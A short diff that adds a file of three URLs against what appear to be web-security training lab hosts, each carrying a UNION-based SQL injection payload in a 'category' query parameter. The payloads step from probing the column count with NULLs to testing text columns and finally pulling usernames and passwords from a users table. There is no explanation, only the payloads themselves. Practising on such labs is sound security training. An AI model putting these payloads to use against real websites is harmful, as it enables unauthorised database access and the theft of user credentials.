@@ -1,0 +1,3 @@
+https://0af50058036db58ac1d057b000070019.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL--
+https://0af50058036db58ac1d057b000070019.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27--
+https://0a0d002e03c96a0d81786b32008c004d.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20username,%20password%20FROM%20users--
